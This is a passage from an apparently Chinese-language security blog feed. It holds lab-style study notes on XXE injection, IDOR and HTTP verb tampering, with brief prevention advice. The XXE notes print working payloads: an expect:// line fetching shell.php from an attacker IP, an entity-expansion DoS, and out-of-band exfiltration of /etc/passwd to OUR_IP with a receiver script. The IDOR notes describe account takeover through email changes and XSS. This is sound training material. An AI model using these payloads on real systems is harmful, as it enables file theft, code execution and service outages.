&quot;expect://curl$IFS-O$IFS&#39;OUR_IP/shell.php&#39;&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;company;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><blockquote><p>注意：我们用$IFS替换了上面XML代码中的所有空格，以避免破坏XML语法。此外，许多其他字符（如|、&gt;和{）可能会破坏代码，因此我们应该避免使用它们。</p></blockquote><p>注意：expect模块在现代PHP服务器上默认不会启用&#x2F;安装，因此这种攻击可能并不总是有效的。这就是为什么XXE通常用于披露敏感的本地文件和源代码，这可能会揭示额外的漏洞或获得代码执行的方式。</p><h2 id="Other-XXE-Attacks"><a href="#Other-XXE-Attacks" class="headerlink" title="Other XXE Attacks"></a>Other XXE Attacks</h2><p>另一种经常通过XXE漏洞进行的常见攻击是SSRF利用，该漏洞用于枚举本地打开的端口，并通过XXE弱点访问其页面和其他受限网页。服务器端攻击模块完全涵盖了SSRF，XXE攻击也可以采用相同的技术。 最后，XXE攻击的一个常见用途是对托管web服务器造成拒绝服务（DOS），使用以下有效载荷：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY a0 &quot;DOS&quot; &gt;  &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;  &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;  &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;  &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;  &lt;!ENTITY a5 &quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;&gt;  &lt;!ENTITY a6 &quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;&gt;  &lt;!ENTITY a7 &quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;&gt;  &lt;!ENTITY a8 &quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;&gt;  &lt;!ENTITY a9 &quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;&gt;          &lt;!ENTITY a10 &quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;&gt;        ]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;a10;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><p>这个有效负载将a0实体定义为DOS，在a1中多次引用它，在a2中引用a1，以此类推，直到后端服务器的内存由于自引用循环而耗尽。然而，这种攻击不再适用于现代web服务器（例如Apache），因为它们可以防止实体自引用。</p><h1 id="Advanced-File-Disclosure"><a href="#Advanced-File-Disclosure" class="headerlink" title="Advanced File Disclosure"></a>Advanced File Disclosure</h1><p>并非所有XXE漏洞都可以直接利用，正如我们在上一节中所看到的那样。有些文件格式可能无法通过基本的XXE读取，而在其他情况下，web应用程序在某些情况下可能不会输出任何输入值，因此我们可能会试图通过错误来使用它。</p><h2 id="Advanced-Exfiltration-with-CDATA"><a href="#Advanced-Exfiltration-with-CDATA" class="headerlink" title="Advanced Exfiltration with CDATA"></a>Advanced Exfiltration with CDATA</h2><p>在上一节中，我们看到了如何使用PHP过滤器对PHP源文件进行编码，以便它们在被引用时不会破坏XML格式，这（正如我们所看到的）阻止了我们读取这些文件。但是其他类型的Web应用程序呢？我们可以使用另一种方法为任何web应用程序后端提取任何类型的数据（包括二进制数据）。要输出不符合XML格式的数据，我们可以使用CDATA标记（例如&lt;！[CDATA[file_content]]）包装外部文件引用的内容。通过这种方式，XML解析器将考虑这部分原始数据，这些数据可能包含任何类型的数据，包括任何特殊字符。 解决这个问题的一个简单方法是用&lt;！[CDATA[，一个带有]]&gt;的结束内部实体，然后将我们的外部实体文件放在两者之间，它应该被视为CDATA元素，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY begin &quot;&lt;![CDATA[&quot;&gt;  &lt;!ENTITY file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt;  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY joined &quot;&amp;begin;&amp;file;&amp;end;&quot;&gt;]&gt;</code></pre><p>之后，如果我们引用&amp;joind；实体，它应该包含我们的转义数据。然而，这是行不通的，因为XML阻止连接内部和外部实体，所以我们必须找到更好的方法。 为了绕过这一限制，我们可以使用XML参数实体，这是一种特殊类型的实体，以%字符开头，只能在DTD中使用。参数实体的独特之处在于，如果我们从外部源（例如，我们自己的服务器）引用它们，那么所有这些实体都将被视为外部实体，并且可以连接，如下所示：</p><pre><code class="xml">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</code></pre><p>因此，让我们尝试读取submitDetails.php文件，方法是首先将上述行存储在DTD文件（例如xxe.DTD）中，将其托管在我们的机器上，然后将其作为目标web应用程序上的外部实体引用，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39; &gt; xxe.dtdTanin@htb[/htb]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>现在，我们可以引用我们的外部实体（xxe.dtd），然后打印&amp;joind；我们在上面定义的实体，它应该包含submitDetails.php文件的内容，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt; &lt;!-- reference external file --&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!-- append the end of the CDATA tag --&gt;  &lt;!ENTITY % xxe SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt; &lt;!-- reference our external DTD --&gt;  %xxe;]&gt;...&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;</code></pre><p>一旦我们编写了xxe.dtd文件，并将其托管在我们的机器上，然后将上面的行添加到我们对易受攻击的web应用程序的HTTP请求中，我们就可以最终获得submitDetails.php文件的内容：</p><blockquote><p>注意：在一些现代web服务器中，我们可能无法读取某些文件（如index.php），因为web服务器将防止由文件&#x2F;实体自引用（即XML实体引用循环）引起的DOS攻击，如前一节所述。</p></blockquote><p>当基本的XXE方法不起作用或处理其他web开发框架时，这个技巧会变得非常方便。尝试使用此技巧读取其他文件。</p><h2 id="Error-Based-XXE"><a href="#Error-Based-XXE" class="headerlink" title="Error Based XXE"></a>Error Based XXE</h2><p>我们可能会遇到的另一种情况是，web应用程序可能不会编写任何输出，因此我们无法控制任何XML输入实体来编写其内容。在这种情况下，我们将对XML输出视而不见，因此无法使用我们通常的方法检索文件内容。 如果web应用程序显示运行时错误（例如，PHP错误），并且没有对XML输入进行适当的异常处理，那么我们可以使用此缺陷读取XXE漏洞的输出。如果web应用程序既不编写XML输出也不显示任何错误，那么我们将面临完全盲目的情况，我们将在下一节中对此进行讨论。 让我们考虑一下本节末尾&#x2F;error中的练习，其中没有任何XML输入实体显示在屏幕上。因此，我们没有可以控制的实体来编写文件输出。首先，让我们尝试发送格式错误的XML数据，并查看web应用程序是否显示任何错误。为此，我们可以删除任何关闭标记，更改其中一个，使其不关闭（例如，<roo>而不是<root>），或者仅引用不存在的实体，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121101005.jpeg" alt="cause_error"></p><p>我们看到，我们确实导致web应用程序显示错误，而且它还显示了web服务器目录，我们可以使用该目录读取其他文件的源代码。现在，我们可以利用这个漏洞来泄露文件内容。要做到这一点，我们将使用与之前使用的技术类似的技术。首先，我们将托管一个DTD文件，该文件包含以下有效负载：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></pre><p>上面的负载定义了文件参数实体，然后将其与一个不存在的实体连接。在我们之前的练习中，我们连接了三根弦。在这种情况下，%nonExistingEntity；不存在，所以web应用程序会抛出一个错误，说这个实体不存在，以及我们加入的%file；作为错误的一部分。还有许多其他变量可能会导致错误，比如错误的URI或引用文件中有错误的字符。 现在，我们可以调用外部DTD脚本，然后引用错误实体，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %error;]&gt;</code></pre><p>一旦我们像前面那样托管DTD脚本，并将上述有效负载作为XML数据发送（不需要包括任何其他XML数据），我们将获得&#x2F;etc&#x2F;hosts文件的内容</p><p>这种方法也可以用于读取文件的源代码。我们所要做的就是更改DTD脚本中的文件名，以指向我们想要读取的文件（例如“file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;submitDetails.php“）。然而，这种方法不如以前读取源文件的方法可靠，因为它可能有长度限制，而且某些特殊字符仍然可能会破坏它。</p><h1 id="Blind-Data-Exfiltration"><a href="#Blind-Data-Exfiltration" class="headerlink" title="Blind Data Exfiltration"></a>Blind Data Exfiltration</h1><p>在上一节中，我们看到了一个盲XXE漏洞的示例，在该漏洞中，我们没有收到任何包含任何XML输入实体的输出。由于web服务器显示PHP运行时错误，我们可以使用此缺陷从显示的错误中读取文件的内容。在本节中，我们将了解如何在完全盲目的情况下获取文件的内容，在这种情况下，我们既不会获得任何XML实体的输出，也不会显示任何PHP错误。</p><h2 id="Out-of-band-Data-Exfiltration"><a href="#Out-of-band-Data-Exfiltration" class="headerlink" title="Out-of-band Data Exfiltration"></a>Out-of-band Data Exfiltration</h2><p>如果我们试图通过在&#x2F;wind上找到的练习重复任何方法，我们会很快注意到它们似乎都不起作用，因为我们无法在web应用程序响应上打印任何内容。对于这种情况，我们可以使用一种称为带外（OOB）数据过滤的方法，该方法通常用于具有许多网络攻击的类似盲情况，如盲SQL注入、盲命令注入、盲XSS，当然还有盲XXE。跨站点脚本（XSS）和Whitebox Pentesting 101:Command Injections模块都讨论了类似的攻击，这里我们将利用类似的攻击进行轻微修改，以适应我们的XXE漏洞。 在我们之前的攻击中，我们使用了带外攻击，因为我们在机器中托管了DTD文件，并使web应用程序连接到我们（因此是带外）。所以，我们这次的进攻将非常相似，只有一个显著的区别。我们将使web应用程序向我们的web服务器发送一个web请求，其中包含我们正在读取的文件的内容，而不是让web应用程序将我们的文件实体输出到特定的XML实体。 为此，我们可以首先为正在读取的文件的内容使用一个参数实体，同时使用PHP过滤器对其进行base64编码。然后，我们将创建另一个外部参数实体并将其引用到我们的IP，并将文件参数值作为通过HTTP请求的URL的一部分，如下所示：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></pre><p>例如，如果我们要读取的文件的内容为XXE_SAMPLE_DATA，那么文件参数将保存其base64编码的数据（WFhFX1NBTVBMRV9EQVRB）。当XML试图从我们的机器引用外部oob参数时，它将请求<a href="http://our_ip:8000/?content=WFhFX1NBTVBMRV9EQVRB.%E6%9C%80%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%AF%B9WFhFX1NBTVBMRV9EQVRB%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82%E6%88%91%E4%BB%AC%E7%94%9A%E8%87%B3%E5%8F%AF%E4%BB%A5%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PHP%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BB%88%E7%AB%AF%EF%BC%9A">http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB.最后，我们可以对WFhFX1NBTVBMRV9EQVRB字符串进行解码，以获得文件的内容。我们甚至可以编写一个简单的PHP脚本，自动检测编码的文件内容，对其进行解码，并将其输出到终端：</a></p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;content&#39;]))&#123;    error_log(&quot;\n\n&quot; . base64_decode($_GET[&#39;content&#39;]));&#125;?&gt;</code></pre><p>因此，我们将首先将上面的PHP代码写入index.PHP，然后在8000端口上启动一个PHP服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ vi index.php # here we write the above PHP codeTanin@htb[/htb]$ php -S 0.0.0.0:8000PHP 7.4.3 Development Server (http://0.0.0.0:8000) started</code></pre><p>现在，为了启动我们的攻击，我们可以使用与基于错误的攻击中使用的负载类似的负载，只需添加<root>&amp;content</root>，它需要引用我们的实体，并让它向我们的机器发送带有文件内容的请求：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %oob;]&gt;&lt;root&gt;&amp;content;&lt;/root&gt;</code></pre><p>然后，我们可以将请求发送到web应用程序：</p><p>最后，我们可以回到我们的终端，我们将看到我们确实得到了请求及其解码内容：</p><pre><code class="shell-session">PHP 7.4.3 Development Server (http://0.0.0.0:8000) started10.10.14.16:46256 Accepted10.10.14.16:46256 [200]: (null) /xxe.dtd10.10.14.16:46256 Closing10.10.14.16:46258 Acceptedroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin...SNIP...</code></pre><p>提示：除了将base64编码的数据存储为URL的参数外，我们还可以使用DNS OOB Exfiltering，将编码的数据作为URL的子域（例如ENCODEDTEXT.our.website.com），然后使用tcpdump等工具捕获任何传入流量并解码子域字符串以获取数据。诚然，这种方法更先进，需要付出更多的努力来过滤数据。</p><h2 id="Automated-OOB-Exfiltration"><a href="#Automated-OOB-Exfiltration" class="headerlink" title="Automated OOB Exfiltration"></a>Automated OOB Exfiltration</h2><p>尽管在某些情况下，我们可能不得不使用上面学到的手动方法，但在许多其他情况下，可以使用工具自动化盲XXE数据的过滤过程。 <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>就是这样一个工具。该工具支持我们在本模块中学到的大多数技巧，包括基本XXE、CDATA源exfiltering、基于错误的XXE和盲目OOB XXE。 要使用此工具进行OOB自动过滤，我们可以首先将该工具克隆到我们的机器上，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.gitCloning into &#39;XXEinjector&#39;......SNIP...</code></pre><p>一旦我们有了这个工具，我们就可以从Burp复制HTTP请求，并将其写入一个文件供工具使用。我们不应该包括完整的XML数据，只包括第一行，并在它后面写XXEINJECT作为工具的位置定位器：</p><pre><code class="http">POST /blind/submitDetails.php HTTP/1.1Host: 10.129.201.94Content-Length: 169User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Content-Type: text/plain;charset=UTF-8Accept: */*Origin: http://10.129.201.94Referer: http://10.129.201.94/blind/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;XXEINJECT</code></pre><p>现在，我们可以运行该工具，–host&#x2F;-httpport标志是我们的IP和端口，–file标志是我们上面写的文件，–path标志是我们想要读取的文件。我们还将选择–oob&#x3D;http和–phpfilter标志来重复我们上面所做的oob攻击，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter...SNIP...[+] Sending request with malicious XML.[+] Responding with XML for: /etc/passwd[+] Retrieved data:</code></pre><p>我们看到该工具没有直接打印数据。这是因为我们对数据进行base64编码，所以它不会被打印出来。在任何情况下，所有经过过滤的文件都会存储在该工具下的Logs文件夹中，我们可以在那里找到我们的文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...SNIP..</code></pre><h1 id="XXE-Prevention"><a href="#XXE-Prevention" class="headerlink" title="XXE Prevention"></a>XXE Prevention</h1><p>除了使用最新的XML库之外，web应用程序的某些XML配置还有助于降低XXE被利用的可能性。其中包括： </p><p>禁用引用自定义文档类型定义（DTD） </p><p>禁用引用外部XML实体 禁用参数实体处理 禁用对XInclude的支持</p><p> 防止实体引用循环 </p><p>我们看到的另一件事是基于错误的XXE利用。因此，我们应该在web应用程序中始终有适当的异常处理，并且应该始终禁用在web服务器中显示运行时错误。 如果我们错过了更新某些XML库，这样的配置应该是另一层保护，并且还应该防止XXE被利用。然而，在这种情况下，我们可能仍然使用易受攻击的库，并且只应用防止利用的变通方法，这并不理想。 由于XML数据引入了各种问题和漏洞，许多人还建议使用其他格式，如JSON或YAML。这还包括避免使用依赖XML（例如SOAP）的API标准，而使用基于JSON的API（例如REST）。 最后，使用Web应用程序防火墙（WAF）是防止XXE利用的另一层保护措施。然而，我们永远不应该完全依赖WAF，让后端变得脆弱，因为WAF总是可以绕过的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Intro-to-XXE&quot;&gt;&lt;a href=&quot;#Intro-to-XXE&quot; class=&quot;headerlink&quot; title=&quot;Intro to XXE&quot;&gt;&lt;/a&gt;Intro to XXE&lt;/h1&gt;&lt;p&gt;XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Web Attacks-IDOR</title>
    <link href="https://taninluv.github.io/2023/09/06/Web-Attacks-IDOR/"/>
    <id>https://taninluv.github.io/2023/09/06/Web-Attacks-IDOR/</id>
    <published>2023-09-06T08:21:28.000Z</published>
    <updated>2023-09-11T06:58:58.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-IDOR"><a href="#Intro-to-IDOR" class="headerlink" title="Intro to IDOR"></a>Intro to IDOR</h1><p>不安全的直接对象引用（IDOR）漏洞是最常见的web漏洞之一，会严重影响易受攻击的web应用程序。当web应用程序暴露对对象（如文件或数据库资源）的直接引用时，就会出现IDOR漏洞，最终用户可以直接控制该对象以获得对其他类似对象的访问权限。如果由于缺乏可靠的访问控制系统，任何用户都可以访问任何资源，则该系统被认为是易受攻击的。 构建一个可靠的访问控制系统非常具有挑战性，这就是IDOR漏洞普遍存在的原因。此外，自动化识别访问控制系统弱点的过程也相当困难，这可能导致这些弱点在进入生产之前一直无法识别。 例如，如果用户请求访问他们最近上传的文件，他们可能会得到一个链接，例如（download.php？file_id&#x3D;123）。因此，由于链接直接引用了带有（file_id&#x3D;122）的文件，如果我们试图用（download.php！file_id&#x3D;124）访问另一个文件（可能不属于我们），会发生什么？如果web应用程序在后端没有适当的访问控制系统，我们可以通过发送带有file_id的请求来访问任何文件。在许多情况下，我们可能会发现id很容易被猜测，从而可以根据我们的权限检索许多我们不应该访问的文件或资源。</p><h2 id="What-Makes-an-IDOR-Vulnerability"><a href="#What-Makes-an-IDOR-Vulnerability" class="headerlink" title="What Makes an IDOR Vulnerability"></a>What Makes an IDOR Vulnerability</h2><p>仅仅公开对内部对象或资源的直接引用本身并不是一个漏洞。然而，这可能会使利用另一个漏洞成为可能：弱访问控制系统。许多web应用程序通过限制用户访问可以检索这些资源的页面、函数和API来限制用户访问资源。然而，如果用户以某种方式访问了这些页面（例如，通过共享&#x2F;猜测的链接），会发生什么？他们仍然能够通过简单的链接访问相同的资源吗？如果web应用程序的后端没有访问控制系统来比较用户的身份验证和资源的访问列表，那么他们可能能够。<br>有许多方法可以实现用于web应用程序的可靠访问控制系统，例如具有基于角色的访问控制（RBAC）系统。主要结论是，IDOR漏洞的存在主要是由于后端缺乏访问控制。如果用户直接引用了缺乏访问控制的web应用程序中的对象，攻击者就有可能查看或修改其他用户的数据。<br>许多开发人员忽略了构建访问控制系统；因此，大多数web应用程序和移动应用程序在后端都没有受到保护。在这样的应用程序中，所有用户都可以任意访问后端上的所有其他用户的数据。阻止用户访问其他用户数据的唯一方法是应用程序的前端实现，该应用程序旨在只显示用户的数据。在这种情况下，手动操作HTTP请求可能会显示所有用户都可以完全访问所有数据，从而导致成功的攻击。<br>所有这些都使IDOR漏洞成为任何web或移动应用程序最关键的漏洞之一，这不仅是因为暴露了直接的对象引用，而且主要是因为缺乏可靠的访问控制系统。即使是一个基本的访问控制系统也很难开发。一个覆盖整个web应用程序而不干扰其功能的全面访问控制系统可能是一项更困难的任务。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p> Try to read the details of the user with ‘uid&#x3D;5’. What is their ‘uuid’ value?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110933889.png" alt="image-20230911093346827"></p><p>抓包后提交的信息稍微多，我们先修改uid，发现返回：</p><pre><code>uid mismatch</code></pre><p>他似乎把接口与uid相对应起来，我们同时更改接口号为2：</p><pre><code>uuid mismatch</code></pre><p>正如我们所看到的，这一次，我们收到一条错误消息，说uuid不匹配。web应用程序似乎正在检查我们发送的uuid值是否与用户的uuid匹配。由于我们正在发送自己的uuid，因此我们的请求失败了。这似乎是防止用户更改其他用户详细信息的另一种访问控制形式。 接下来，让我们看看是否可以创建一个向API端点发出POST请求的新用户。我们可以将请求方法更改为POST，将uid更改为新的uid，并将请求发送到新uid的API端点：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110940315.png" alt="image-20230911094045276"></p><p>尝试将我们的角色更改为admin&#x2F;administrator以获得更高的权限。不幸的是，在不知道有效角色名称的情况下，我们在HTTP响应中得到无效角色</p><p>此时我们发现uid与接口号是相对应的，我们尝试像端口5发送get请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110945977.png" alt="image-20230911094538943"></p><p>拿到uuid</p><h1 id="Chaining-IDOR-Vulnerabilities"><a href="#Chaining-IDOR-Vulnerabilities" class="headerlink" title="Chaining IDOR Vulnerabilities"></a>Chaining IDOR Vulnerabilities</h1><p>通常，对API端点的GET请求应该返回被请求用户的详细信息，因此我们可以尝试调用它来查看是否可以检索用户的详细内容。我们还注意到，页面加载后，它会通过向同一API端点的GET请求获取用户详细信息：</p><p>如前一节所述，我们的HTTP请求中唯一的授权形式是role&#x3D;employee cookie，因为HTTP请求不包含任何其他形式的用户特定授权，例如JWT令牌。即使令牌确实存在，除非后端访问控制系统将其与请求的对象详细信息进行主动比较，否则我们仍然可以检索其他用户的详细信息。</p><h2 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h2><h2 id="Modifying-Other-Users’-Details"><a href="#Modifying-Other-Users’-Details" class="headerlink" title="Modifying Other Users’ Details"></a>Modifying Other Users’ Details</h2><p>除了允许我们查看潜在的敏感细节外，修改另一个用户的详细信息的能力还使我们能够执行其他几种攻击。一种类型的攻击是修改用户的电子邮件地址，然后请求密码重置链接，该链接将发送到我们指定的电子邮件地址中，从而使我们能够控制他们的帐户。另一种潜在的攻击是在“about”字段中放置XSS有效载荷，一旦用户访问其编辑配置文件页面，就会执行该有效载荷，使我们能够以不同的方式攻击用户。</p><h2 id="Chaining-Two-IDOR-Vulnerabilities"><a href="#Chaining-Two-IDOR-Vulnerabilities" class="headerlink" title="Chaining Two IDOR Vulnerabilities"></a>Chaining Two IDOR Vulnerabilities</h2><p>由于我们发现了IDOR Information Disclosure漏洞，我们还可以枚举所有用户并查找其他角色，最好是管理员角色。尝试编写一个脚本来枚举所有用户，类似于我们之前所做的操作。 一旦我们枚举了所有用户，我们将找到一个具有以下详细信息的管理员用户：</p><p>通过将我们从IDOR information Disclosure漏洞获得的信息与API端点上的IDOR Insecure Function Calls攻击相结合，我们可以修改其他用户的详细信息并创建&#x2F;删除用户，同时绕过各种访问控制检查。在许多情况下，我们通过IDOR漏洞泄露的信息可以用于其他攻击，如IDOR或XSS，从而导致更复杂的攻击或绕过现有的安全机制。 有了我们的新角色，我们还可以执行批量分配来更改所有用户的特定字段，比如在他们的配置文件中放置XSS有效载荷，或者将他们的电子邮件更改为我们指定的电子邮件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Intro-to-IDOR&quot;&gt;&lt;a href=&quot;#Intro-to-IDOR&quot; class=&quot;headerlink&quot; title=&quot;Intro to IDOR&quot;&gt;&lt;/a&gt;Intro to IDOR&lt;/h1&gt;&lt;p&gt;不安全的直接对象引用（IDOR）漏洞是最常见的web</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Web Attacks-HTTP Verb Tampering</title>
    <link href="https://taninluv.github.io/2023/09/06/Web-Attacks/"/>
    <id>https://taninluv.github.io/2023/09/06/Web-Attacks/</id>
    <published>2023-09-06T06:52:16.000Z</published>
    <updated>2023-09-06T08:17:32.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-HTTP-Verb-Tampering"><a href="#Intro-to-HTTP-Verb-Tampering" class="headerlink" title="Intro to HTTP Verb Tampering"></a>Intro to HTTP Verb Tampering</h1><p>HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。</p><span id="more"></span><h2 id="HTTP-Verb-Tampering"><a href="#HTTP-Verb-Tampering" class="headerlink" title="HTTP Verb Tampering"></a>HTTP Verb Tampering</h2><p> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9 different verbs</a></p><p>可以想象，上面的一些方法可以执行非常敏感的功能，比如将（PUT）或删除（DELETE）文件写入后端服务器上的webroot目录。正如Web请求模块中所讨论的，如果Web服务器没有安全地配置为管理这些方法，我们可以使用它们来控制后端服务器。然而，HTTP谓词篡改攻击更常见（因此更为关键）的原因是，它们是由后端web服务器或web应用程序中的错误配置引起的，这两者都可能导致漏洞。</p><h2 id="Insecure-Configurations"><a href="#Insecure-Configurations" class="headerlink" title="Insecure Configurations"></a>Insecure Configurations</h2><p>不安全的web服务器配置导致第一类HTTP谓词篡改漏洞。web服务器的身份验证配置可能仅限于特定的HTTP方法，这将使一些HTTP方法在没有身份验证的情况下可以访问。例如，系统管理员可以使用以下配置要求对特定网页进行身份验证：</p><pre><code class="xml">&lt;Limit GET POST&gt;    Require valid-user&lt;/Limit&gt;</code></pre><p>正如我们所看到的，即使配置为身份验证方法指定了GET和POST请求，攻击者仍然可能使用不同的HTTP方法（如HEAD）来完全绕过此身份验证机制，这将在下一节中看到。这最终导致身份验证绕过，并允许攻击者访问他们不应该访问的网页和域。</p><h2 id="Insecure-Coding"><a href="#Insecure-Coding" class="headerlink" title="Insecure Coding"></a>Insecure 